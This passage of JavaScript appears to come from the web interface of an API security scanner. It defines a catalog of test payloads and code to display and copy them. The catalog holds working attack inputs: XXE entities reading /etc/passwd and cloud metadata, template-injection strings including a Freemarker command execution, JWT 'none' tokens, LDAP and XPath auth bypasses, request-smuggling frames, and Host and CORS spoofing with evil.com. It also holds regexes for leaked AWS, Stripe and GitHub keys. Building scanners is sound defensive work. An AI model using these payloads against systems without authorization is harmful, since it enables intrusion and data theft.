      { tag: "CUSTOM HEADER", val: "%0d%0aX-Injected-Header:apiscan_test" },
      { tag: "RAW CRLF", val: "\\r\\nSet-Cookie:apiscan_crlf=1" },
      { tag: "BODY SPLITTING", val: "%0d%0a%0d%0a<script>alert(1)</script>" },
      { tag: "UNICODE CRLF", val: "%E5%98%8A%E5%98%8DSet-Cookie:apiscan_crlf=1" },
      { tag: "DOUBLE CRLF", val: "%0d%0a%0d%0aSet-Cookie:apiscan=1" },
      { tag: "LF INJECTION", val: "%0aSet-Cookie:apiscan_crlf=1" },
      { tag: "CR INJECTION", val: "%0dSet-Cookie:apiscan_crlf=1" },
    ]
  },
  xxe: {
    desc: "Tests for XML External Entity (XXE) vulnerabilities including local file exfiltration, SSRF, XInclude tags, and parameter entity DTD processing.",
    type: "Insertion Point (XML Body & Raw)",
    vectors: [
      { tag: "FILE ENTITY", val: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><val>&xxe;</val></root>" },
      { tag: "WINDOWS INI", val: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root><val>&xxe;</val></root>" },
      { tag: "SSRF IMDS", val: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"> %xxe;]><root></root>" },
      { tag: "PHP FILTER", val: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><root><val>&xxe;</val></root>" },
      { tag: "XINCLUDE TAG", val: "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></root>" },
      { tag: "OOB DTD", val: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://canary.<oob_server>/ext.dtd\"> %dtd;]><root></root>" },
    ]
  },
  ssti: {
    desc: "Evaluates dynamic template expressions using high-entropy arithmetic multiplication (49382*18273 = 902347286) to detect Jinja2, Twig, SpEL, and Freemarker.",
    type: "Insertion Point (Query, Body, Header)",
    vectors: [
      { tag: "JINJA2 / TWIG", val: "{{49382*18273}}" },
      { tag: "SPEL / VELOCITY", val: "${49382*18273}" },
      { tag: "SPRING EL", val: "#{49382*18273}" },
      { tag: "DELIMITED", val: "*{{49382*18273}}*" },
      { tag: "PYTHON SUBCLASS", val: "{{''.__class__.__mro__[2].__subclasses__()}}" },
      { tag: "FREEMARKER EXEC", val: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}" },
      { tag: "SMARTY TEMPLATE", val: "{php}echo 49382*18273;{/php}" },
      { tag: "RUBY ERB", val: "<%= 49382*18273 %>" },
    ]
  },
  idor: {
    desc: "Identifies Insecure Direct Object References by probing sequential, extreme numeric boundaries, UUID formats, and baseline object difference analysis.",
    type: "Insertion Point (Numeric, ID, Path)",
    vectors: [
      { tag: "INCREMENT +1", val: "<id> + 1 (e.g. 101 -> 102)" },
      { tag: "DECREMENT -1", val: "<id> - 1 (e.g. 101 -> 100)" },
      { tag: "ROOT ZERO", val: "0" },
      { tag: "NEGATIVE BOUNDARY", val: "-1" },
      { tag: "HIGH INTEGER", val: "999999" },
      { tag: "MAX 32-BIT INT", val: "2147483647" },
      { tag: "NULL UUID", val: "00000000-0000-0000-0000-000000000000" },
      { tag: "CROSS-TENANT", val: "tenant_id=2 (Horizontal privilege shift)" },
    ]
  },
  jwt: {
    desc: "Checks JSON Web Token security: 'none' algorithm bypass, null signatures, public key confusion (RS256->HS256), and dictionary secret cracking.",
    type: "Header & Cookie (Authorization, token)",
    vectors: [
      { tag: "ALG NONE LOWER", val: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." },
      { tag: "ALG NONE TITLE", val: "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." },
      { tag: "ALG NONE UPPER", val: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." },
      { tag: "NULL SIGNATURE", val: "<header>.<payload>." },
      { tag: "KEY CONFUSION", val: "RS256 -> HS256 signed with Server Public Key" },
      { tag: "WEAK SECRET", val: "Cracking against 40+ keys: secret, admin123, 123456, jwt_secret, password" },
      { tag: "TAMPERED ROLE", val: "Modified payload claim: {\"role\": \"admin\", \"is_admin\": true}" },
    ]
  },
  massassign: {
    desc: "Injects privileged administrative and multi-tenant fields into JSON request bodies to detect Mass Assignment and privilege escalation vulnerabilities.",
    type: "Endpoint / Body JSON",
    vectors: [
      { tag: "ADMIN FLAG", val: "{\"is_admin\": true}" },
      { tag: "ROLE ADMIN", val: "{\"role\": \"admin\"}" },
      { tag: "ROLE SUPERUSER", val: "{\"role\": \"superuser\"}" },
      { tag: "ORGANIZATION ID", val: "{\"organizationId\": 1}" },
      { tag: "TENANT ID", val: "{\"tenantId\": 1}" },
      { tag: "VERIFIED STATUS", val: "{\"verified\": true}" },
      { tag: "TIER UPGRADE", val: "{\"tier\": \"enterprise\"}" },
      { tag: "BALANCE SPOOF", val: "{\"wallet_balance\": 99999}" },
      { tag: "ALL SCOPES", val: "{\"scopes\": [\"admin:all\", \"write:all\"]}" },
      { tag: "PERMISSIONS", val: "{\"permissions\": [\"*\"]}" },
    ]
  },
  cors: {
    desc: "Audits CORS policy misconfigurations: origin reflection, trust of null origin, trusted subdomain hyphens, and loopback origin permissions.",
    type: "Endpoint Level",
    vectors: [
      { tag: "ARBITRARY ORIGIN", val: "Origin: https://evil.com" },
      { tag: "NULL ORIGIN", val: "Origin: null" },
      { tag: "SUBDOMAIN SPOOF", val: "Origin: https://target.com.evil.com" },
      { tag: "PREFIX SPOOF", val: "Origin: https://evil-target.com" },
      { tag: "LOCAL TRUST", val: "Origin: http://localhost:3000" },
      { tag: "LOOPBACK TRUST", val: "Origin: http://127.0.0.1:8080" },
      { tag: "AT-SIGN SPOOF", val: "Origin: https://target.com@evil.com" },
    ]
  },
  graphql: {
    desc: "Probes GraphQL endpoints for full schema introspection exposure, field suggestion leaks, and batch query Denial of Service susceptibility.",
    type: "Endpoint Level",
    vectors: [
      { tag: "INTROSPECTION", val: "query { __schema { types { name fields { name } } } }" },
      { tag: "TYPE PROBE", val: "query { __typename }" },
      { tag: "BATCH QUERY DOS", val: "[{\"query\":\"{__typename}\"}, {\"query\":\"{__typename}\"}, ...x15]" },
      { tag: "FIELD SUGGESTION", val: "query { __schema { queryType { name } } nonexistent_as }" },
      { tag: "DIRECTIVE PROBE", val: "query { __schema { directives { name locations } } }" },
    ]
  },
  prototype_pollution: {
    desc: "Injects prototype properties into JSON bodies and URL queries to test for Server-Side Prototype Pollution in Node.js / JavaScript runtimes.",
    type: "Endpoint / Body & Query",
    vectors: [
      { tag: "PROTO OBJECT", val: "{\"__proto__\": {\"apiscan_polluted\": true}}" },
      { tag: "CONSTRUCTOR PROTO", val: "{\"constructor\": {\"prototype\": {\"apiscan_polluted\": true}}}" },
      { tag: "QUERY PROTO", val: "__proto__[apiscan_polluted]=true" },
      { tag: "QUERY CONSTRUCTOR", val: "constructor.prototype.apiscan_polluted=true" },
      { tag: "DOT NOTATION", val: "{\"__proto__.apiscan_polluted\": true}" },
    ]
  },
  hpp: {
    desc: "Sends duplicate and array-formatted HTTP parameters in query strings and bodies to detect Parameter Pollution and precedence override flaws.",
    type: "Insertion Point (Query & Form Body)",
    vectors: [
      { tag: "DUPLICATE QUERY", val: "?param=val1&param=val2" },
      { tag: "ARRAY QUERY", val: "?param[]=val1&param[]=val2" },
      { tag: "COMMA DELIMITED", val: "?param=val1,val2" },
      { tag: "PRIVILEGE OVERRIDE", val: "?role=user&role=admin" },
      { tag: "BODY DUPLICATE", val: "param=original&param=polluted" },
    ]
  },
  xpath: {
    desc: "Injects XPath query syntax into authentication and search parameters to bypass XML database queries and elicit syntax parser errors.",
    type: "Insertion Point (Query & Body)",
    vectors: [
      { tag: "AUTH BYPASS", val: "' or '1'='1" },
      { tag: "EMPTY QUOTE", val: "' or ''='" },
      { tag: "INTEGER TRUE", val: "1 or 1=1" },
      { tag: "NODE SEARCH", val: "x' or 1=1 or 'x'='y" },
      { tag: "EXTRACT NODES", val: "'] | //* | /['" },
      { tag: "PARENT LOOKUP", val: "admin' or 1=1]/parent::*" },
      { tag: "CLOSING QUOTE", val: "') or ('1'='1" },
    ]
  },
  ldap: {
    desc: "Probes LDAP directories using filter termination characters, wildcard queries, and blind boolean filter pairs to achieve authentication bypass.",
    type: "Insertion Point (Query & Body)",
    vectors: [
      { tag: "WILDCARD BYPASS", val: "*)(uid=*))(|(uid=*" },
      { tag: "PASSWORD WILDCARD", val: "*)(|(password=*)" },
      { tag: "ADMIN WILDCARD", val: "admin)(&(password=*)" },
      { tag: "USER PASSWORD", val: "admin*)((|userPassword=*)" },
      { tag: "BOOLEAN AND", val: "*)(&)" },
      { tag: "SPECIAL CHARS", val: "*()|%26'" },
      { tag: "NULL TERMINATION", val: "*))%00" },
      { tag: "OBJECT CATEGORY", val: "admin*)(objectCategory=person)(objectClass=user" },
    ]
  },
  deserial: {
    desc: "Sends magic byte signatures and serialized object stubs for Java, PHP, .NET, Jackson, and PyYAML to trigger deserialization exceptions without gadgets.",
    type: "Insertion Point & Body JSON",
    vectors: [
      { tag: "JAVA MAGIC BYTES", val: "rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==" },
      { tag: "PHP SERIALIZED", val: "O:8:\"stdClass\":0:{}" },
      { tag: "PHP ARRAY", val: "a:1:{s:4:\"test\";s:4:\"test\";}" },
      { tag: "PHP UNKNOWN CLASS", val: "O:21:\"NonExistentClass_AS\":0:{}" },
      { tag: ".NET TYPENAME", val: "{\"$type\":\"System.Object\"}" },
      { tag: ".NET OBJECTDATA", val: "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\"}" },
      { tag: "JACKSON @TYPE", val: "{\"@type\":\"com.apiscan.DoesNotExist\"}" },
      { tag: "JACKSON @CLASS", val: "{\"@class\":\"com.apiscan.DoesNotExist\"}" },
      { tag: "PYYAML UNSAFE", val: "!!python/name:apiscan.nonexistent_module" },
      { tag: "PYYAML OBJECT", val: "!!python/object:__main__.ApiScanProbe {}" },
      { tag: "NODE SERIALIZE", val: "{\"rce\":\"_$$ND_FUNC$$_function(){}()\"}" },
      { tag: "RUBY MARSHAL", val: "BAhvOgtNeUNsYXNzAA==" },
    ]
  },
  ratelimit: {
    desc: "Executes concurrent request bursts (15-25 requests in 500ms) and rotates proxy IP headers to test for missing rate limiting and client throttling.",
    type: "Endpoint & Numeric Param",
    vectors: [
      { tag: "BURST ATTACK", val: "15-25 concurrent requests within a 500ms window" },
      { tag: "IP ROTATION", val: "X-Forwarded-For: 10.0.0.X (rotating client IPs)" },
      { tag: "REAL-IP BYPASS", val: "X-Real-IP: 192.168.1.X" },
      { tag: "CLIENT-IP HEADER", val: "Client-IP: 172.16.0.X" },
      { tag: "PATH VARIATION", val: "Case toggling /api/login vs /api/Login" },
    ]
  },
  smuggling: {
    desc: "Detects HTTP Request Smuggling & Protocol Desynchronization flaws across front-end reverse proxies and backend servers (CL.TE, TE.CL, TE.TE obfuscations, CVE-2025-54142 OPTIONS desync, CVE-2025-66373 chunk desync, and H2.CL HTTP/2 downgrade).",
    type: "Endpoint / Proxy Framing",
    vectors: [
      { tag: "CL.TE CLASSIC", val: "POST / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nA\\r\\nX" },
      { tag: "TE.CL CLASSIC", val: "POST / HTTP/1.1\\r\\nHost: target\\r\\nTransfer-Encoding: chunked\\r\\nContent-Length: 6\\r\\n\\r\\n0\\r\\n\\r\\nX" },
      { tag: "TE.TE OBFUSCATION", val: "Transfer-Encoding: chunked\\x00 (Null byte)" },
      { tag: "TE.TE OBFUSCATION", val: "Transfer-Encoding : chunked (Trailing space before colon)" },
      { tag: "TE.TE OBFUSCATION", val: "Transfer-Encoding: \\tchunked (Leading tab)" },
      { tag: "TE.TE DUPLICATE", val: "Transfer-Encoding: identity\\r\\nTransfer-Encoding: chunked" },
      { tag: "CL.CL DUPLICATE", val: "Content-Length: 6\\r\\nContent-Length: 4" },
      { tag: "CVE-2025-54142", val: "OPTIONS / HTTP/1.1\\r\\nHost: target\\r\\nContent-Length: 30\\r\\n\\r\\nX (Method body desync)" },
      { tag: "CHUNK EXTENSION", val: "0;discard-this=junk\\r\\n\\r\\nX (Terminating chunk parameter)" },
      { tag: "CVE-2025-66373", val: "abc;foo=bar\\r\\n0\\r\\n\\r\\nX (Invalid hex chunk boundary)" },
      { tag: "H2.CL DOWNGRADE", val: "POST / HTTP/2\\r\\nHost: target\\r\\ncontent-length: 4 (HTTP/2 -> HTTP/1.1 downgrade)" },
      { tag: "HTTP/1.0 DOWNGRADE", val: "POST / HTTP/1.0\\r\\nHost: target\\r\\nConnection: keep-alive\\r\\nContent-Length: 6" },
    ]
  },
  api_version: {
    desc: "Discovers unauthenticated or deprecated legacy API route versions by mutating version segments (/v1/ -> /v0/, /v2/, /beta/, /internal/).",
    type: "Endpoint Level",
    vectors: [
      { tag: "VERSION V1", val: "/api/v1/... (checking older implementation)" },
      { tag: "VERSION V0", val: "/api/v0/... (pre-release routes)" },
      { tag: "VERSION V2", val: "/api/v2/... (newer unauthenticated route)" },
      { tag: "BETA ROUTE", val: "/api/beta/..." },
      { tag: "INTERNAL ROUTE", val: "/api/internal/..." },
      { tag: "LEGACY ROUTE", val: "/api/legacy/..." },
      { tag: "TEST ROUTE", val: "/api/test/..." },
      { tag: "STAGE ROUTE", val: "/api/stage/..." },
    ]
  },
  hosthdr: {
    desc: "Injects arbitrary Host and X-Forwarded-Host values to test for Host header injection, password reset poisoning, and web cache poisoning.",
    type: "Endpoint Level",
    vectors: [
      { tag: "ARBITRARY HOST", val: "Host: evil.com" },
      { tag: "PORT AT-SPOOF", val: "Host: target.com:443@evil.com" },
      { tag: "X-FORWARDED-HOST", val: "X-Forwarded-Host: evil.com" },
      { tag: "X-HOST HEADER", val: "X-Host: evil.com" },
      { tag: "DUAL HOST HEADERS", val: "Host: target.com\\r\\nHost: evil.com" },
      { tag: "FORWARDED HEADER", val: "Forwarded: host=evil.com;proto=https" },
    ]
  },
  csrf: {
    desc: "Tests state-changing API endpoints (POST, PUT, DELETE, PATCH) for missing CSRF protection by stripping Origin/Referer and replaying without session cookies.",
    type: "Endpoint Level",
    vectors: [
      { tag: "STRIP ORIGIN", val: "Origin header removed" },
      { tag: "EVIL ORIGIN", val: "Origin: https://evil.com" },
      { tag: "SPOOFED REFERER", val: "Referer: https://evil.com/attacker.html" },
      { tag: "COOKIELESS REPLAY", val: "Request replayed with session cookies stripped" },
      { tag: "EMPTY REFERER", val: "Referer header removed" },
    ]
  },
  authz: {
    desc: "Audits for Broken Function Level Authorization (BFLA) by testing method tunneling, administrative action execution, and privilege role headers.",
    type: "Endpoint Level",
    vectors: [
      { tag: "METHOD OVERRIDE", val: "X-HTTP-Method-Override: POST / PUT / DELETE" },
      { tag: "METHOD HEADER", val: "X-HTTP-Method: DELETE" },
      { tag: "QUERY METHOD", val: "?_method=DELETE" },
      { tag: "ROLE ADMIN", val: "X-User-Role: admin" },
      { tag: "ROLE SUPERUSER", val: "X-Role: superuser" },
      { tag: "IS-ADMIN HEADER", val: "X-Is-Admin: true" },
    ]
  },
  exposure: {
    desc: "Audits HTTP responses passively for exposed credentials, sensitive PII, Stripe keys, AWS tokens, private keys, and passwords.",
    type: "Passive Audit (0 Extra Requests)",
    vectors: [
      { tag: "JWT TOKEN", val: "eyJhbGciOi... (JSON Web Tokens in response body)" },
      { tag: "AWS KEY", val: "AKIA[0-9A-Z]{16} (AWS Access Key ID)" },
      { tag: "STRIPE KEY", val: "sk_live_[0-9a-zA-Z]{24} (Stripe Secret Key)" },
      { tag: "GITHUB TOKEN", val: "ghp_[0-9a-zA-Z]{36} (GitHub Personal Access Token)" },
      { tag: "PRIVATE KEY", val: "-----BEGIN (RSA/EC/DSA/OPENSSH) PRIVATE KEY-----" },
      { tag: "CREDENTIAL LEAK", val: "\"password\": \"...\", \"secret\": \"...\", \"apiKey\": \"...\"" },
      { tag: "PII DATA", val: "Credit cards, SSNs, phone numbers, personal email leaks" },
    ]
  },
  debug_params: {
    desc: "Injects hidden administrative and debug query parameters and JSON flags to uncover hidden functionality, debug leaks, or auth bypasses.",
    type: "Endpoint / Query & Body",
    vectors: [
      { tag: "DEBUG FLAG", val: "debug=true" },
      { tag: "DEBUG INT", val: "debug=1" },
      { tag: "ADMIN FLAG", val: "admin=true" },
      { tag: "ADMIN INT", val: "admin=1" },
      { tag: "TEST INT", val: "test=1" },
      { tag: "SHOW ERRORS", val: "show_errors=1" },
      { tag: "VIEW AS ADMIN", val: "view_as=admin" },
      { tag: "DEVELOPER FLAG", val: "developer=1" },
      { tag: "INTERNAL FLAG", val: "internal=true" },
      { tag: "ENABLE TRACE", val: "enable_trace=1" },
      { tag: "ROLE ADMIN", val: "role=admin" },
      { tag: "IMPERSONATE", val: "impersonate=admin" },
    ]
  },
  verb_tampering: {
    desc: "Tests alternate HTTP methods (PUT, DELETE, PATCH, HEAD, OPTIONS) and method override headers to bypass access controls on REST routes (BFLA).",
    type: "Endpoint Level",
    vectors: [
      { tag: "PUT METHOD", val: "PUT <url> (testing if resource update is permitted without auth)" },
      { tag: "DELETE METHOD", val: "DELETE <url> (testing if deletion bypasses access filter)" },
      { tag: "PATCH METHOD", val: "PATCH <url>" },
      { tag: "HEAD METHOD", val: "HEAD <url> (testing auth bypass via header leak)" },
      { tag: "OPTIONS METHOD", val: "OPTIONS <url> (extracting Allow & Access-Control-Allow-Methods)" },
      { tag: "OVERRIDE PUT", val: "POST + X-HTTP-Method-Override: PUT" },
      { tag: "OVERRIDE DELETE", val: "POST + X-HTTP-Method-Override: DELETE" },
      { tag: "OVERRIDE PATCH", val: "POST + X-HTTP-Method: PATCH" },
      { tag: "CUSTOM VERB", val: "TRACK <url> / PROPFIND <url>" },
    ]
  },
  ip_spoofing: {
    desc: "Injects reverse proxy and client identity headers to test whether internal IP restrictions or administrative ACLs can be bypassed.",
    type: "Endpoint Level",
    vectors: [
      { tag: "X-FORWARDED-FOR", val: "X-Forwarded-For: 127.0.0.1" },
      { tag: "X-REAL-IP", val: "X-Real-IP: 127.0.0.1" },
      { tag: "X-ORIGINATING-IP", val: "X-Originating-IP: 127.0.0.1" },
      { tag: "X-REMOTE-IP", val: "X-Remote-IP: 127.0.0.1" },
      { tag: "X-REMOTE-ADDR", val: "X-Remote-Addr: 127.0.0.1" },
      { tag: "X-CLIENT-IP", val: "X-Client-IP: 127.0.0.1" },
      { tag: "CLIENT-IP", val: "Client-IP: 127.0.0.1" },
      { tag: "TRUE-CLIENT-IP", val: "True-Client-IP: 127.0.0.1" },
      { tag: "CLUSTER-CLIENT-IP", val: "Cluster-Client-IP: 127.0.0.1" },
      { tag: "CUSTOM AUTH IP", val: "X-Custom-IP-Authorization: 127.0.0.1" },
      { tag: "ORIGINAL URL", val: "X-Original-URL: /admin" },
      { tag: "REWRITE URL", val: "X-Rewrite-URL: /admin" },
    ]
  },
  content_type_tamper: {
    desc: "Switches MIME content types to test for Simple Request CORS preflight bypass (text/plain) and unhardened XML parser confusion on JSON APIs.",
    type: "Endpoint Level",
    vectors: [
      { tag: "TEXT/PLAIN CORS", val: "Content-Type: text/plain with JSON payload (bypasses CORS preflight)" },
      { tag: "XML PARSER CHECK", val: "Content-Type: application/xml with converted XML body" },
      { tag: "TEXT/XML CHECK", val: "Content-Type: text/xml" },
      { tag: "FORM-URLENCODED", val: "Content-Type: application/x-www-form-urlencoded" },
      { tag: "EMPTY CONTENT-TYPE", val: "Content-Type header omitted" },
    ]
  },
  resource_exhaustion: {
    desc: "Injects massive limits, extreme integers, and negative boundaries into pagination parameters to test for Denial of Service and uncapped memory allocation.",
    type: "Point & Endpoint (Pagination & Numeric)",
    vectors: [
      { tag: "MASSIVE LIMIT", val: "limit=100000" },
      { tag: "EXTREME INTEGER", val: "limit=9999999" },
      { tag: "NEGATIVE BOUNDARY", val: "limit=-1" },
      { tag: "NEGATIVE OFFSET", val: "offset=-99999" },
      { tag: "FLOAT BOUNDARY", val: "limit=1.5" },
      { tag: "ARRAY NOTATION", val: "limit[]=-1" },
      { tag: "ZERO VALUE", val: "size=0" },
      { tag: "PAGE UNDERFLOW", val: "page=-1" },
    ]
  },
};

let _asCurrentPayloads = [];

async function asOpenPayloadModal(key, ev) {
  if (ev) {
    ev.stopPropagation();
    ev.preventDefault();
  }
  const modal = document.getElementById("as-payloads-modal");
  if (!modal) return;

  const data = _AS_MODULE_PAYLOADS_CATALOG[key] || {
    desc: "Active security testing module for API endpoints and parameters.",
    type: "Active Security Module",
    vectors: [{ tag: "PROBE", val: `Dynamic automated security tests for ${key}` }]
  };

  const titleEl = document.getElementById("as-payloads-modal-title");
  const subEl   = document.getElementById("as-payloads-modal-sub");
  const descEl  = document.getElementById("as-payloads-modal-desc");
  const badgeEl = document.getElementById("as-payloads-type-badge");
  const searchEl = document.getElementById("as-payloads-search");

  const label = _asModuleLabel(key);
  if (titleEl) titleEl.textContent = label;
  if (subEl) subEl.textContent = `Module key: ${key}`;
  if (descEl) descEl.textContent = data.desc;
  if (badgeEl) badgeEl.textContent = data.type;
  if (searchEl) searchEl.value = "";

  _asCurrentPayloads = [...data.vectors];
  _asRenderPayloadList(_asCurrentPayloads);
  modal.style.display = "flex";

  // Also query backend asynchronously for any extra dynamic vectors
  try {
    const r = await fetch(`${AS_BASE}/apiscan/module/${encodeURIComponent(key)}/payloads`);
    if (r.ok) {
      const live = await r.json();
      if (live && live.vectors && live.vectors.length) {
        const existingVals = new Set(_asCurrentPayloads.map(v => v.val));
        let added = false;
        live.vectors.forEach(v => {
          if (!existingVals.has(v.val)) {
            _asCurrentPayloads.push(v);
            existingVals.add(v.val);
            added = true;
          }
        });
        if (added) {
          _asRenderPayloadList(_asCurrentPayloads);
        }
      }
    }
  } catch (_) { /* offline / backend down fallback */ }
}
window.asOpenPayloadModal = asOpenPayloadModal;

function asClosePayloadModal() {
  const modal = document.getElementById("as-payloads-modal");
  if (modal) modal.style.display = "none";
}
window.asClosePayloadModal = asClosePayloadModal;

function _asRenderPayloadList(list) {
  const listEl = document.getElementById("as-payloads-list");
  const countEl = document.getElementById("as-payloads-count");
  if (!listEl) return;

  if (countEl) countEl.textContent = `${list.length} vector${list.length !== 1 ? "s" : ""}`;

  if (!list.length) {
    listEl.innerHTML = `<div style="padding:20px;text-align:center;color:var(--text3);font-size:11px">No matching vectors</div>`;
    return;
  }

  listEl.innerHTML = list.map((item, idx) => {
    const rawVal = item.val || "";
    const safeAttr = _asEsc(rawVal).replace(/'/g, "&#39;");
    return `<div class="as-payload-item">
      <span style="color:var(--text3);font-size:10px;min-width:24px">#${idx + 1}</span>
      <span class="as-payload-tag">${_asEsc(item.tag || "VECTOR")}</span>
      <span class="as-payload-text">${_asEsc(rawVal)}</span>
      <button type="button" class="as-payload-copy-btn" onclick="asCopyPayload('${safeAttr}', this)" title="Copy payload">Copy</button>
    </div>`;
  }).join("");
}

function asFilterPayloadsModal(query) {
  const q = (query || "").trim().toLowerCase();
  if (!q) {
    _asRenderPayloadList(_asCurrentPayloads);
    return;
  }
  const filtered = _asCurrentPayloads.filter(item => {
    return (item.val && item.val.toLowerCase().includes(q)) ||
           (item.tag && item.tag.toLowerCase().includes(q));
  });
  _asRenderPayloadList(filtered);
}
window.asFilterPayloadsModal = asFilterPayloadsModal;

function asCopyPayload(text, btnEl) {
  if (!navigator.clipboard) return;
  navigator.clipboard.writeText(text).then(() => {
    if (btnEl) {
      const orig = btnEl.textContent;
      btnEl.textContent = "✓ Copied";
      btnEl.style.color = "var(--green, #3fb950)";
      setTimeout(() => {
        btnEl.textContent = orig;
        btnEl.style.color = "";
      }, 1200);
    }
  });
}
window.asCopyPayload = asCopyPayload;

function asCopyAllPayloads() {
  if (!_asCurrentPayloads || !_asCurrentPayloads.length) return;
  const q = (document.getElementById("as-payloads-search")?.value || "").trim().toLowerCase();
  const list = q ? _asCurrentPayloads.filter(item => (item.val && item.val.toLowerCase().includes(q)) || (item.tag && item.tag.toLowerCase().includes(q))) : _asCurrentPayloads;
  const allText = list.map(item => item.val).join("\n");
  if (navigator.clipboard) {
    navigator.clipboard.writeText(allText).then(() => {
      _asShowToast(`Copied ${list.length} payloads to clipboard`);
    });
  }
}
window.asCopyAllPayloads = asCopyAllPayloads;

// Close modal on Escape
if (typeof window !== "undefined" && typeof window.addEventListener === "function") {
  window.addEventListener("keydown", (e) => {
    if (e.key === "Escape") {
      asClosePayloadModal();
    }
  });
}

function asSelectAllModules() {
  _asModuleKeys.forEach((k) => { _asModuleSel[k] = true; });
  _asModulesCustom = true;
  _asRenderModulesGrid();
}
window.asSelectAllModules = asSelectAllModules;

function asDeselectAllModules() {
  _asModuleKeys.forEach((k) => { _asModuleSel[k] = false; });
  _asModulesCustom = true;
  _asRenderModulesGrid();
}
window.asDeselectAllModules = asDeselectAllModules;

function asSelectProfileModules() {
  _asApplyProfileModules(_asProfile);
}
window.asSelectProfileModules = asSelectProfileModules;

async function _asLoadModulesCatalog() {
  try {
    const r = await fetch(`${AS_BASE}/apiscan/modules`);
    if (!r.ok) return;
    const d = await r.json();
    _asModuleKeys = d.modules || [];
    _asProfilesMap = d.profiles || {};
    _asApplyProfileModules(_asProfile);
  } catch (_) { /* backend down — modules panel stays empty */ }
}

// ── Init ──────────────────────────────────────────────────────────────────────
window.asInit = function() {
  // Profile / threads / timeout / delay
  const profSel = document.getElementById("as-profile-select");
  const thrdInp = document.getElementById("as-threads-input");
  const toInp   = document.getElementById("as-timeout-input");
  const delaySel = document.getElementById("as-delay-select");
  if (profSel) profSel.addEventListener("change", () => {
    _asProfile = profSel.value;
    _asApplyProfileModules(_asProfile);
  });
  if (thrdInp) thrdInp.addEventListener("input",  () => { _asThreads = parseInt(thrdInp.value)||6; });
  if (toInp)   toInp.addEventListener("input",    () => { _asTimeout = parseInt(toInp.value)||10; });
  if (delaySel) delaySel.addEventListener("change", () => {
    _asDelaySec = parseFloat(delaySel.value) || 0;
  });
  _asLoadModulesCatalog();
  asSyncOobHint();

  // Search / filter
  const searchInp = document.getElementById("as-search-input");
  const methSel   = document.getElementById("as-method-filter-select");
  if (searchInp) searchInp.addEventListener("input", () => { _asFilterText   = searchInp.value; _asRenderList(); });
  if (methSel)   methSel.addEventListener("change",  () => { _asMethodFilter = methSel.value;   _asRenderList(); });

  // Drag-resize: Probes list ↔ Detail panel (horizontal)
  (function() {
    const handle = document.getElementById("as-hresize");
    const left   = document.getElementById("as-log-panel");
    const right  = document.getElementById("as-probe-panel");
    if (!handle || !left || !right) return;
    let dragging = false, startX = 0, startW = 0;
    handle.addEventListener("mousedown", e => {
      dragging = true; startX = e.clientX;
      startW   = left.getBoundingClientRect().width;
      handle.classList.add("as-dragging");
      document.body.style.cursor     = "col-resize";
      document.body.style.userSelect = "none";
      e.preventDefault();
    });
    document.addEventListener("mousemove", e => {
      if (!dragging) return;
      const parent = left.parentElement;
      const total  = parent.getBoundingClientRect().width - handle.offsetWidth;
      const newW   = Math.max(160, Math.min(total - 200, startW + (e.clientX - startX)));
      left.style.flex  = "none";
      left.style.width = `${newW}px`;
      right.style.flex = "1";
    });
    document.addEventListener("mouseup", () => {
      if (!dragging) return;
      dragging = false;
      handle.classList.remove("as-dragging");
      document.body.style.cursor = document.body.style.userSelect = "";
    });
  })();

  // Drag-resize: REQUEST ↔ RESPONSE sections (vertical)
  (function() {
    const handle = document.getElementById("as-vresize");
    const top    = document.getElementById("as-req-panel");
    const bot    = document.getElementById("as-resp-panel");
    if (!handle || !top || !bot) return;
    let dragging = false, startY = 0, startH = 0;
    handle.addEventListener("mousedown", e => {
      dragging = true; startY = e.clientY;
      startH   = top.getBoundingClientRect().height;
      handle.classList.add("as-dragging");
      document.body.style.cursor     = "row-resize";
      document.body.style.userSelect = "none";
      e.preventDefault();
    });
    document.addEventListener("mousemove", e => {
      if (!dragging) return;
      const parent = top.parentElement;
      const avail  = parent.getBoundingClientRect().height
                     - handle.offsetHeight
                     - (parent.querySelector(".as-probe-section")?.offsetHeight || 0);
      const newH   = Math.max(60, Math.min(avail - 60, startH + (e.clientY - startY)));
      top.style.flex   = "none";
      top.style.height = `${newH}px`;
      bot.style.flex   = "1";
      bot.style.height = "auto";
    });
    document.addEventListener("mouseup", () => {
      if (!dragging) return;
      dragging = false;
      handle.classList.remove("as-dragging");
      document.body.style.cursor = document.body.style.userSelect = "";
    });
  })();

  // Probe list — detect manual scrolling to pause / resume auto-scroll
  // Rule: if user scrolls UP (away from bottom) → pause auto-scroll.
  //       if user scrolls back down to within 80px of bottom → resume.
  const probeListEl = document.getElementById("as-probe-list");
  if (probeListEl) {
    probeListEl.addEventListener("scroll", () => {
      const distFromBottom = probeListEl.scrollHeight - probeListEl.clientHeight - probeListEl.scrollTop;
      _asProbeAutoScroll = distFromBottom < 80;
    }, { passive: true });
  }
  document.addEventListener("keydown", _asProbeNavKeydown);

  // Drag-resize: Dashboard left (vuln list) ↔ right (API panel)
  (function() {
    const handle = document.getElementById("as-dash-hresize");
    const left   = document.getElementById("as-dash-vuln-panel");
    const right  = document.getElementById("as-dash-api-panel");
    if (!handle || !left || !right) return;
    let dragging = false, startX = 0, startW = 0;
    handle.addEventListener("mousedown", e => {
      dragging = true; startX = e.clientX;
